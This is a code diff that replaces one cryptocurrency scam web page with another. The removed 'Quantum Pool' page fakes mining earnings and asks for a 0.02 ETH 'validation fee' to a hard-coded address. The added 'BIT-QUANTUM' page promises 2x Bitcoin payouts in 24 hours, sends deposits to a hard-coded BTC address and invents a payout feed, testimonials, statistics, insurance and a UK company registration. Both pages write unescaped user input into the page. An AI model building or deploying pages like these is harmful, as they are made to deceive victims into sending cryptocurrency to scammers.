@@ -1,213 +1,435 @@
-<?php
-// --- BACKEND LOGIC ---
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['tx_hash'])) {
-    $wallet = $_POST['node_wallet'] ?? 'Unknown';
-    $tx_hash = $_POST['tx_hash'] ?? '';
-    $folder = 'logs';
-    if (!is_dir($folder)) mkdir($folder, 0777, true);
-    $file = fopen($folder . '/withdraw_requests.csv', 'a');
-    fputcsv($file, [date('Y-m-d H:i:s'), $_SERVER['REMOTE_ADDR'], $wallet, $tx_hash]);
-    fclose($file);
-    header("Location: " . $_SERVER['PHP_SELF'] . "?wd_success=true&user=" . substr($wallet, 0, 6));
-    exit();
-}
-?>
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>QUANTUM TERMINAL V15 | MOBILE READY</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BIT-QUANTUM | Institutional BTC Multiplier & Quantum Arbitrage Engine</title>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;600;700&display=swap" rel="stylesheet">
+    
     <style>
-        :root { --primary: #6366f1; --bg: #010103; }
-        body { background: var(--bg); color: #e2e8f0; font-family: 'Space Grotesk', sans-serif; font-size: 10px; min-height: 100vh; margin: 0; }
-        .glass { background: rgba(10, 12, 18, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
-        .neon-border { border: 1px solid rgba(99, 102, 241, 0.2); }
-        .text-gradient { background: linear-gradient(90deg, #818cf8, #2dd4bf); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        /* Fix Chart Height for Mobile */
-        .chart-container { position: relative; height: 120px; width: 100%; }
-        
-        @media (max-width: 768px) {
-            .mobile-stack { flex-direction: column !important; overflow-y: auto !important; height: auto !important; }
-            .mobile-grid { grid-template-columns: 1fr !important; }
-            .hide-mobile { display: none !important; }
-            .chart-container { height: 150px; }
-            body { overflow-y: auto; }
+        :root {
+            --primary: #f7931a;
+            --secondary: #00d4ff;
+            --bg: #030508;
+            --card-bg: rgba(13, 17, 23, 0.95);
+            --border: rgba(255, 255, 255, 0.1);
+            --text-main: #e6edf3;
+            --text-dim: #8b949e;
+            --success: #3fb950;
+            --glass: rgba(255, 255, 255, 0.03);
         }
 
-        .scanline { position: fixed; top: 0; left: 0; height: 100%; width: 100%; background: linear-gradient(to bottom, transparent, rgba(99, 102, 241, 0.02) 50%, transparent); animation: scan 10s linear infinite; pointer-events: none; z-index: 100; }
-        @keyframes scan { from { transform: translateY(-100%); } to { transform: translateY(100%); } }
-        .marquee { white-space: nowrap; animation: marquee 20s linear infinite; }
-        @keyframes marquee { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
+        * { box-sizing: border-box; scroll-behavior: smooth; }
+        body {
+            background-color: var(--bg);
+            background-image: 
+                radial-gradient(circle at 0% 0%, rgba(247, 147, 26, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 100% 100%, rgba(0, 212, 255, 0.1) 0%, transparent 40%);
+            color: var(--text-main);
+            font-family: 'Rajdhani', sans-serif;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        /* --- Header Section --- */
+        nav {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 8%; background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(20px); border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 1.6rem; font-weight: 700; color: var(--primary); text-shadow: 0 0 15px rgba(247,147,26,0.4); }
+        .nav-links { display: flex; gap: 25px; align-items: center; }
+        .nav-links a { color: var(--text-dim); text-decoration: none; font-weight: 600; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
+        .nav-links a:hover { color: var(--primary); }
+
+        .btn-connect {
+            background: rgba(247, 147, 26, 0.1); border: 1px solid var(--primary);
+            color: var(--primary); padding: 8px 20px; border-radius: 5px;
+            font-weight: bold; cursor: pointer; transition: 0.3s; font-family: 'Orbitron';
+        }
+        .btn-connect:hover { background: var(--primary); color: #000; }
+
+        /* --- Hero Section --- */
+        .hero { text-align: center; padding: 100px 5% 50px; }
+        .hero h1 { 
+            font-family: 'Orbitron', sans-serif; font-size: clamp(2.5rem, 6vw, 4.5rem); 
+            margin: 0; letter-spacing: 6px; line-height: 1.1;
+            background: linear-gradient(180deg, #fff 40%, #555 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .hero p { color: var(--text-dim); font-size: 1.3rem; max-width: 800px; margin: 25px auto; }
+
+        /* --- TradingView Section --- */
+        .chart-wrapper {
+            max-width: 1200px; margin: 0 auto 60px;
+            background: var(--card-bg); border: 1px solid var(--border);
+            border-radius: 24px; overflow: hidden; height: 500px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        }
+
+        /* --- Engine Card --- */
+        .engine-container {
+            max-width: 600px; margin: 40px auto;
+            background: var(--card-bg); backdrop-filter: blur(20px);
+            border: 1px solid var(--border); border-radius: 30px;
+            padding: 50px; position: relative; box-shadow: 0 0 80px rgba(0,0,0,0.6);
+        }
+        .engine-container::before {
+            content: ""; position: absolute; inset: -2px; border-radius: 32px;
+            background: linear-gradient(45deg, var(--primary), transparent, var(--secondary));
+            z-index: -1; opacity: 0.3;
+        }
+
+        .input-group { position: relative; margin-bottom: 30px; }
+        .input-group label { position: absolute; top: -12px; left: 20px; background: #0b0e11; padding: 0 10px; color: var(--primary); font-family: 'Orbitron'; font-size: 0.75rem; }
+        input {
+            width: 100%; padding: 22px; background: rgba(0,0,0,0.5); border: 1px solid #30363d;
+            border-radius: 15px; color: #fff; font-size: 1.8rem; font-family: 'Rajdhani'; font-weight: 700; outline: none;
+        }
+        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(247,147,26,0.2); }
+
+        .btn-main {
+            width: 100%; padding: 25px; background: linear-gradient(90deg, #f7931a, #ffc107);
+            border: none; border-radius: 15px; color: #000; font-family: 'Orbitron';
+            font-weight: 800; font-size: 1.5rem; cursor: pointer; transition: 0.4s;
+        }
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(247,147,26,0.4); }
+
+        /* --- Live Stats Strip --- */
+        .stats-strip {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px; max-width: 1200px; margin: 60px auto; padding: 0 5%;
+        }
+        .stat-card { background: var(--glass); padding: 25px; border-radius: 15px; border: 1px solid var(--border); text-align: center; }
+        .stat-card h3 { margin: 0; color: var(--secondary); font-family: 'Orbitron'; font-size: 1.8rem; }
+        .stat-card span { color: var(--text-dim); font-size: 0.8rem; text-transform: uppercase; }
+
+        /* --- Live Table --- */
+        .table-section { max-width: 1200px; margin: 80px auto; padding: 0 5%; }
+        .table-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        table { width: 100%; border-collapse: collapse; background: var(--glass); border-radius: 15px; overflow: hidden; }
+        th { text-align: left; padding: 20px; color: var(--text-dim); border-bottom: 1px solid #30363d; font-family: 'Orbitron'; font-size: 0.75rem; }
+        td { padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.95rem; }
+        .payout-amt { color: var(--primary); font-weight: bold; }
+        .status-tag { color: var(--success); font-weight: bold; font-size: 0.8rem; display: flex; align-items: center; gap: 8px; }
+
+        /* --- Forum & FAQ Grid --- */
+        .info-grid { max-width: 1200px; margin: 80px auto; display: grid; grid-template-columns: 1.5fr 1fr; gap: 40px; padding: 0 5%; }
+        .forum-box { background: var(--card-bg); border: 1px solid var(--border); border-radius: 20px; padding: 30px; }
+        .chat-area { height: 350px; overflow-y: auto; margin-bottom: 20px; }
+        .chat-msg { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; margin-bottom: 12px; border-left: 3px solid var(--primary); }
+        .chat-msg b { color: var(--secondary); font-size: 0.85rem; display: block; margin-bottom: 5px; }
+
+        .faq-box { color: var(--text-dim); line-height: 1.6; }
+        .faq-item { margin-bottom: 25px; }
+        .faq-item h4 { color: #fff; margin: 0 0 10px; font-family: 'Orbitron'; font-size: 1rem; }
+
+        /* --- Roadmap --- */
+        .roadmap-section { max-width: 1200px; margin: 100px auto; padding: 0 5%; text-align: center; }
+        .roadmap-flex { display: flex; justify-content: space-between; margin-top: 50px; position: relative; }
+        .roadmap-flex::before { content: ""; position: absolute; top: 15px; left: 0; width: 100%; height: 2px; background: #30363d; z-index: -1; }
+        .road-point { width: 22%; }
+        .road-point .dot { width: 30px; height: 30px; background: #0b0e11; border: 4px solid #30363d; border-radius: 50%; margin: 0 auto 20px; }
+        .road-point.active .dot { border-color: var(--primary); box-shadow: 0 0 15px var(--primary); background: var(--primary); }
+        .road-point h5 { color: var(--primary); font-family: 'Orbitron'; margin: 0; }
+
+        /* --- Footer --- */
+        footer { background: #010409; padding: 100px 8% 40px; border-top: 1px solid #30363d; margin-top: 100px; }
+        .f-cols { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 60px; }
+        .f-cols h4 { font-family: 'Orbitron'; color: #fff; margin-bottom: 25px; font-size: 0.9rem; }
+        .f-cols ul { list-style: none; padding: 0; margin: 0; color: var(--text-dim); font-size: 0.9rem; line-height: 2.2; }
+        .f-cols li:hover { color: var(--primary); cursor: pointer; }
+
+        /* --- Popup Notif --- */
+        .payout-popup {
+            position: fixed; bottom: -100px; left: 30px; background: var(--card-bg);
+            border: 1px solid var(--primary); padding: 15px 25px; border-radius: 12px;
+            display: flex; align-items: center; gap: 15px; transition: 0.6s; z-index: 9999;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .payout-popup.show { bottom: 30px; }
+
+        /* --- Modal Payment --- */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10001; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .modal-box { background: #0d1117; padding: 45px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; max-width: 450px; }
+        .qr-area { background: #fff; width: 200px; height: 200px; margin: 25px auto; padding: 10px; border-radius: 15px; }
+        .btc-addr { background: #000; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 0.8rem; margin: 20px 0; border: 1px dashed var(--primary); color: var(--primary); cursor: pointer; }
+
     </style>
 </head>
-<body class="p-2 flex flex-col gap-2 relative">
-    <div class="scanline"></div>
+<body>
 
-    <header class="glass neon-border rounded-xl p-3 flex justify-between items-center shrink-0">
-        <div class="flex items-center gap-3">
-            <div class="bg-indigo-600 p-2 rounded-lg shadow-[0_0_15px_#4f46e5]">
-                <span class="text-white font-black text-sm italic">Q</span>
+    <nav>
+        <div class="logo">BIT-QUANTUM</div>
+        <div class="nav-links">
+            <a href="#chart">Market</a>
+            <a href="#engine">Engine</a>
+            <a href="#live">Payouts</a>
+            <a href="#faq">FAQ</a>
+            <button class="btn-connect" id="walletBtn">CONNECT WALLET</button>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <span style="color:var(--primary); font-weight:bold; letter-spacing: 3px; font-family: 'Orbitron'; font-size: 0.8rem;">ENGINE STATUS: ONLINE // V4.2 CORE</span>
+        <h1>QUANTUM BTC MULTIPLIER</h1>
+        <p>Harness institutional-grade High-Frequency Arbitrage. <br>Our AI nodes capture market spreads to deliver <b>2.00x Payouts</b> in exactly 24 hours.</p>
+
+        <div class="chart-wrapper" id="chart">
+            <div class="tradingview-widget-container" style="height:100%;width:100%">
+                <div id="tradingview_1" style="height:100%;width:100%"></div>
+                <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                <script type="text/javascript">
+                new TradingView.widget({
+                    "autosize": true,
+                    "symbol": "COINBASE:BTCUSD",
+                    "interval": "15",
+                    "timezone": "Etc/UTC",
+                    "theme": "dark",
+                    "style": "1",
+                    "locale": "en",
+                    "toolbar_bg": "#f1f3f6",
+                    "enable_publishing": false,
+                    "hide_top_toolbar": true,
+                    "container_id": "tradingview_1"
+                });
+                </script>
+            </div>
+        </div>
+
+        <div class="engine-container" id="engine">
+            <div class="input-group">
+                <label>AMOUNT TO MULTIPLY</label>
+                <input type="number" id="investAmt" placeholder="0.005" step="0.001">
+            </div>
+            <button class="btn-main" onclick="openPayment()">MULTIPLY MY BITCOIN</button>
+            <p style="font-size: 0.75rem; color: var(--text-dim); margin-top: 20px; letter-spacing: 1px;">
+                🛡️ SECURED BY SAFU INSURANCE FUND & AES-256 ENCRYPTION
+            </p>
+        </div>
+    </section>
+
+    <section class="stats-strip">
+        <div class="stat-card">
+            <span>Total Value Locked</span>
+            <h3 id="tvlVal">1,482.10 BTC</h3>
+        </div>
+        <div class="stat-card">
+            <span>Distributed Payouts</span>
+            <h3 id="payVal">2,964.20 BTC</h3>
+        </div>
+        <div class="stat-card">
+            <span>HFT Active Nodes</span>
+            <h3>18,402</h3>
+        </div>
+        <div class="stat-card">
+            <span>Global Users</span>
+            <h3>42,109</h3>
+        </div>
+    </section>
+
+    <section class="table-section" id="live">
+        <div class="table-header">
+            <h3 style="font-family:'Orbitron'; margin:0;">LIVE NETWORK SETTLEMENTS</h3>
+            <span style="color:var(--secondary); font-size:0.8rem;">● REAL-TIME BLOCKCHAIN SYNC</span>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>RECIPIENT WALLET</th>
+                    <th>DEPOSIT</th>
+                    <th>2.0X PAYOUT</th>
+                    <th>TX HASH</th>
+                    <th>STATUS</th>
+                </tr>
+            </thead>
+            <tbody id="payoutData">
+                </tbody>
+        </table>
+    </section>
+
+    
+
+    <section class="info-grid" id="faq">
+        <div class="forum-box">
+            <h4 style="font-family:'Orbitron'; margin-top:0; color:var(--primary);">COMMUNITY LIVE FEED</h4>
+            <div class="chat-area" id="chatFlow">
+                <div class="chat-msg"><b>Admin_Node_04:</b> System check complete. All arbitrage paths are clear.</div>
+                <div class="chat-msg"><b>CryptoWhale:</b> Sent 1 BTC earlier, just got 2 BTC back. This engine is a beast.</div>
+                <div class="chat-msg"><b>SatoshiLover:</b> Been using Bit-Quantum for 2 months. 100% success rate.</div>
+            </div>
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="chatMsg" style="font-size:1rem; padding:15px;" placeholder="Message community...">
+                <button class="btn-connect" onclick="sendChat()">POST</button>
+            </div>
+        </div>
+        
+        <div class="faq-box">
+            <h4 style="font-family:'Orbitron'; color:var(--primary);">SYSTEM PROTOCOLS</h4>
+            <div class="faq-item">
+                <h4>Quantum HFT Engine</h4>
+                <p>We use high-frequency trading algorithms to exploit micro-discrepancies between exchanges like Coinbase and Binance. Profits are distributed instantly after a 24-hour cycle.</p>
+            </div>
+            <div class="faq-item">
+                <h4>SAFU Protection</h4>
+                <p>5% of all profits are diverted to the Secure Asset Fund for Users. Your initial deposit is 100% insured against any technical market anomalies.</p>
+            </div>
+            <div class="faq-item">
+                <h4>No Registration</h4>
+                <p>As a Web3 native platform, we don't require personal data. Your wallet address is your identity. Connect, deposit, and receive.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="roadmap-section">
+        <h2 style="font-family:'Orbitron';">ROADMAP 2025</h2>
+        <div class="roadmap-flex">
+            <div class="road-point">
+                <div class="dot"></div>
+                <h5>Q1 2025</h5>
+                <p>Engine V4.2 Upgrade</p>
+            </div>
+            <div class="road-point active">
+                <div class="dot"></div>
+                <h5>Q2 2025</h5>
+                <p>Layer-2 Integration</p>
+            </div>
+            <div class="road-point">
+                <div class="dot"></div>
+                <h5>Q3 2025</h5>
+                <p>Mobile App Launch</p>
+            </div>
+            <div class="road-point">
+                <div class="dot"></div>
+                <h5>Q4 2025</h5>
+                <p>Global Bank Partnership</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="f-cols">
+            <div>
+                <div class="logo" style="margin-bottom:20px;">BIT-QUANTUM</div>
+                <p style="line-height:1.8;">Institutional-grade Bitcoin multiplier using advanced HFT and Quantum computing. Headquartered in London Financial District.</p>
             </div>
             <div>
-                <h1 class="font-black text-sm text-gradient uppercase">Quantum_Pool</h1>
-                <p class="text-[6px] tracking-[0.3em] text-indigo-400 font-bold">NODE_V15_MOBILE</p>
+                <h4>Company</h4>
+                <ul><li>About Us</li><li>Financial Reports</li><li>Insurance Policy</li><li>Terms of Service</li></ul>
+            </div>
+            <div>
+                <h4>Resources</h4>
+                <ul><li>Help Center</li><li>API Documentation</li><li>Node Status</li><li>Live Charts</li></ul>
+            </div>
+            <div>
+                <h4>Legal</h4>
+                <ul><li>Anti-Money Laundering</li><li>Privacy Policy</li><li>Risk Disclosure</li><li>Compliance</li></ul>
             </div>
         </div>
-        <div class="text-right">
-            <p class="text-gray-500 text-[7px] uppercase font-bold">ETH_BALANCE</p>
-            <p id="eth-balance" class="text-white text-sm font-black mono tracking-tighter">0.00000000</p>
-        </div>
-    </header>
-
-    <div class="flex-1 flex mobile-stack gap-2 overflow-hidden">
-        
-        <main class="flex-1 grid grid-cols-2 mobile-grid gap-2 overflow-y-auto pr-1 custom-scroll">
-            </main>
-
-        <aside class="w-full md:w-80 flex flex-col gap-2 shrink-0">
-            <div id="ai-box" class="glass neon-border p-3 rounded-xl flex flex-col items-center justify-center text-center relative overflow-hidden">
-                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-indigo-500 to-cyan-500"></div>
-                <p class="text-[8px] font-black text-indigo-400 uppercase mb-1">AI_DECISION</p>
-                <h2 id="ai-action" class="text-3xl font-black italic tracking-tighter text-white opacity-20">SYNCING</h2>
-                <div id="ai-target" class="text-[7px] text-gray-500 font-bold">WAITING...</div>
-            </div>
-
-            <div class="flex gap-2 shrink-0">
-                <button onclick="startMining()" id="btn-mining" class="flex-1 bg-indigo-600 hover:bg-indigo-500 text-white font-black py-4 rounded-xl uppercase text-[10px] tracking-widest transition-all active:scale-95">Start Mining</button>
-                <button onclick="showWD()" class="flex-1 glass border-white/10 text-white font-bold py-4 rounded-xl uppercase text-[10px] tracking-widest active:scale-95">Withdraw</button>
-            </div>
-
-            <div class="glass neon-border rounded-xl p-3 h-48 md:flex-1 flex flex-col overflow-hidden">
-                <p class="text-[7px] font-black text-gray-500 uppercase mb-2 border-b border-white/5 pb-1 italic">Network_Activity</p>
-                <div id="forum" class="flex-1 overflow-y-auto space-y-2 pr-1 text-[8px]">
-                    <?php if(isset($_GET['wd_success'])): ?>
-                        <div class="p-2 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-emerald-400 animate-pulse">
-                            [SUCCESS] Node @<?php echo $_GET['user']; ?> synchronized.
-                        </div>
-                    <?php endif; ?>
-                </div>
-            </div>
-
-            <div id="wd-gate" class="glass neon-border p-3 rounded-xl hidden bg-indigo-900/20">
-                <p class="text-[8px] text-indigo-400 font-black mb-1">VALIDATION_REQUIRED</p>
-                <p class="text-[7px] text-gray-400 mb-2 italic leading-tight">Fee: 0.02 ETH to Validator Address below.</p>
-                <div class="bg-black/50 p-2 rounded border border-white/10 mb-2 mono text-[7px] text-white break-all">0x015d4438849119cecd8292b8abf9a4bb2d03fdbb</div>
-                <form action="" method="POST" class="flex flex-col gap-2">
-                    <input type="text" name="node_wallet" placeholder="Your Wallet" required class="bg-black/40 border border-white/10 rounded p-3 text-[9px] text-white outline-none">
-                    <input type="text" name="tx_hash" placeholder="TxID Hash" required class="bg-black/40 border border-white/10 rounded p-3 text-[9px] text-white outline-none">
-                    <button type="submit" class="bg-indigo-600 text-white font-black py-3 rounded uppercase text-[10px]">Verify Sync</button>
-                </form>
-            </div>
-        </aside>
-    </div>
-
-    <footer class="glass neon-border p-2 overflow-hidden rounded-lg shrink-0">
-        <div class="marquee mono text-[8px] text-indigo-400 italic">
-            [MARKET] BTC: $94,120 | ETH: $3,210 | XRP: $1.12 | DOGE: $0.38 | PEPE: +15.2% | NODE STATUS: OPTIMIZED | SYNCING BLOCK #192,231
+        <div style="border-top: 1px solid #1a1c23; padding-top: 30px; display:flex; justify-content:space-between; font-size:0.8rem; color:#484f58;">
+            <span>&copy; 2025 BIT-QUANTUM ASSET MANAGEMENT LTD. Registered #11928374 (UK).</span>
+            <span>Verified by <b>Sectigo Secure</b></span>
         </div>
     </footer>
 
+    <div class="payout-popup" id="popup">
+        <div style="background:var(--primary); width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; color:#000; font-weight:bold;">₿</div>
+        <div>
+            <div style="font-size:0.7rem; color:var(--text-dim);">RECENT PAYOUT</div>
+            <div style="font-size:0.9rem; font-weight:bold;"><span id="popAddr">1BvBMs...</span> received <span style="color:var(--primary);" id="popAmt">0.054</span> BTC</div>
+        </div>
+    </div>
+
+    <div class="modal" id="payModal">
+        <div class="modal-box">
+            <h2 style="font-family:'Orbitron'; color:var(--primary); margin:0;">SECURE DEPOSIT</h2>
+            <p style="color:var(--text-dim); font-size:0.9rem; margin-top:10px;">Send BTC to the address below. Your 2x Payout will be processed after 1 confirmation.</p>
+            <div class="qr-area">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=bc1q0sxm0saz3ctwzsczczzw64pd2a07kevtx6yj65" alt="QR" style="width:100%;">
+            </div>
+            <div class="btc-addr" onclick="copyAddr()">bc1q0sxm0saz3ctwzsczczzw64pd2a07kevtx6yj65</div>
+            <button class="btn-main" style="font-size:1rem; padding:15px;" onclick="closePayment()">I HAVE SENT BTC</button>
+        </div>
+    </div>
+
     <script>
-        const assets = [
-            { sym: 'BTC-USD', name: 'BTC' }, { sym: 'ETH-USD', name: 'ETH' },
-            { sym: 'XRP-USD', name: 'XRP' }, { sym: 'DOGE-USD', name: 'DOGE' },
-            { sym: 'PEPE-USD', name: 'PEPE' }, { sym: 'SOL-USD', name: 'SOL' }
-        ];
-
-        const charts = {};
-        const chartData = {};
-        const mainGrid = document.querySelector('main');
-        const DATA_LENGTH = 40; 
-
-        assets.forEach(a => {
-            const container = document.createElement('div');
-            container.id = `cont-${a.sym}`;
-            container.className = 'glass neon-border rounded-xl p-3 flex flex-col relative transition-all duration-500 shrink-0';
-            container.innerHTML = `
-                <div class="flex justify-between items-start mb-2">
-                    <span class="text-[10px] font-black text-white italic tracking-tighter">${a.name}/USDT</span>
-                    <span id="pr-${a.sym}" class="mono text-[10px] font-black text-indigo-300">$ 0.00</span>
-                </div>
-                <div class="chart-container"><canvas id="chart-${a.sym}"></canvas></div>`;
-            mainGrid.appendChild(container);
-
-            chartData[a.sym] = Array(DATA_LENGTH).fill(null);
-            const ctx = document.getElementById(`chart-${a.sym}`).getContext('2d');
-            charts[a.sym] = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: Array(DATA_LENGTH).fill(''),
-                    datasets: [{
-                        data: chartData[a.sym],
-                        borderColor: '#6366f1',
-                        borderWidth: 2,
-                        pointRadius: 0,
-                        tension: 0.3,
-                        fill: true,
-                        backgroundColor: 'rgba(99, 102, 241, 0.05)'
-                    }]
-                },
-                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { display: false } } }
-            });
-        });
-
-        let balance = 0.00000000;
-        let active = false;
-        function startMining() {
-            if(active) return;
-            active = true;
-            document.getElementById('btn-mining').innerText = "LIVE...";
-            document.getElementById('btn-mining').className = "flex-1 bg-emerald-600 text-white font-black py-4 rounded-xl animate-pulse";
-            setInterval(() => {
-                balance += Math.random() * 0.000025;
-                document.getElementById('eth-balance').innerText = balance.toFixed(8);
-            }, 1000);
-        }
-        function showWD() { 
-            const gate = document.getElementById('wd-gate');
-            gate.classList.toggle('hidden');
-            if(!gate.classList.contains('hidden')) gate.scrollIntoView({behavior: 'smooth'});
-        }
-
-        const ws = new WebSocket('wss://ws-feed.exchange.coinbase.com');
-        ws.onopen = () => ws.send(JSON.stringify({ "type": "subscribe", "product_ids": assets.map(a => a.sym), "channels": ["ticker"] }));
-        ws.onmessage = (e) => {
-            const data = JSON.parse(e.data);
-            if(data.type === 'ticker' && data.price) {
-                const price = parseFloat(data.price);
-                const sym = data.product_id;
-                document.getElementById(`pr-${sym}`).innerText = '$ ' + price.toLocaleString(undefined, {minimumFractionDigits: (sym.includes('PEPE') ? 6 : 2)});
-                chartData[sym].shift();
-                chartData[sym].push(price);
-                charts[sym].update('none');
-
-                if(Math.random() > 0.985) {
-                    const dec = Math.random() > 0.5 ? "BUY" : "SELL";
-                    const color = dec === 'BUY' ? '#10b981' : '#ef4444';
-                    document.getElementById('ai-action').innerText = dec;
-                    document.getElementById('ai-action').className = `text-4xl font-black italic opacity-100 transition-all ${dec === 'BUY' ? 'text-emerald-400' : 'text-red-400'}`;
-                    document.getElementById('ai-target').innerText = `TARGET: ${sym.split('-')[0]}`;
-                    document.getElementById(`cont-${sym}`).style.borderColor = color;
-                    setTimeout(() => {
-                        document.getElementById(`cont-${sym}`).style.borderColor = 'rgba(99, 102, 241, 0.2)';
-                    }, 3000);
-                }
-            }
+        // Web3 Connection
+        const walletBtn = document.getElementById('walletBtn');
+        walletBtn.onclick = async () => {
+            if (window.ethereum) {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                walletBtn.innerText = accounts[0].slice(0,6) + "..." + accounts[0].slice(-4);
+                walletBtn.style.background = "rgba(63, 185, 80, 0.2)";
+                walletBtn.style.color = "#3fb950";
+            } else { alert("Please install MetaMask!"); }
         };
 
-        // Simulated Forum
+        // Payment Logic
+        function openPayment() {
+            if(document.getElementById('investAmt').value < 0.001) return alert("Min: 0.001 BTC");
+            document.getElementById('payModal').style.display = "flex";
+        }
+        function closePayment() {
+            document.getElementById('payModal').style.display = "none";
+            alert("Payment detected. System is now Hashing your transaction.");
+        }
+        function copyAddr() { alert("Address copied!"); }
+
+        // Live Table Generator
+        const tbody = document.getElementById('payoutData');
+        const wallets = ["1BvBMs...", "3J98t1...", "bc1qxy...", "1Ez69s...", "34xp4v...", "bc1p0u..."];
+        
+        function addLiveRow() {
+            const rW = wallets[Math.floor(Math.random()*wallets.length)] + Math.floor(Math.random()*999);
+            const rD = (Math.random() * 0.1).toFixed(4);
+            const rP = (rD * 2).toFixed(4);
+            const rT = "0x" + Math.random().toString(16).slice(2, 12);
+            
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td style="font-family:monospace; color:var(--secondary);">${rW}</td>
+                <td>${rD} BTC</td>
+                <td class="payout-amt">${rP} BTC</td>
+                <td style="color:#555; font-size:0.75rem;">${rT}...</td>
+                <td><span class="status-tag">● COMPLETED</span></td>
+            `;
+            if(tbody.children.length > 8) tbody.removeChild(tbody.lastChild);
+            tbody.insertBefore(tr, tbody.firstChild);
+        }
+        setInterval(addLiveRow, 4000);
+        for(let i=0; i<6; i++) addLiveRow();
+
+        // Notification Popup
+        function showPopup() {
+            const pop = document.getElementById('popup');
+            document.getElementById('popAddr').innerText = wallets[Math.floor(Math.random()*wallets.length)];
+            document.getElementById('popAmt').innerText = (Math.random() * 0.5).toFixed(3);
+            pop.classList.add('show');
+            setTimeout(() => pop.classList.remove('show'), 4000);
+        }
+        setInterval(showPopup, 12000);
+
+        // Chat
+        function sendChat() {
+            const inp = document.getElementById('chatMsg');
+            if(!inp.value) return;
+            const flow = document.getElementById('chatFlow');
+            const msg = document.createElement('div');
+            msg.className = 'chat-msg';
+            msg.innerHTML = `<b>YOU:</b> ${inp.value}`;
+            flow.prepend(msg);
+            inp.value = "";
+        }
+
+        // Stats Simulation
         setInterval(() => {
-            const f = document.getElementById('forum');
-            const msgs = ["Hashrate Stable", "Block Found!", "Syncing...", "PEPE Moon!", "Withdrawal Pending"];
-            const msg = `<div class="bg-white/5 p-2 rounded border-l-2 border-indigo-500">@Node_${Math.floor(Math.random()*999)}: ${msgs[Math.floor(Math.random()*msgs.length)]}</div>`;
-            f.insertAdjacentHTML('afterbegin', msg);
-            if(f.children.length > 10) f.lastChild.remove();
-        }, 4000);
+            const tvl = document.getElementById('tvlVal');
+            const cur = parseFloat(tvl.innerText);
+            tvl.innerText = (cur + 0.0002).toFixed(4) + " BTC";
+        }, 3000);
     </script>
 </body>
 </html>
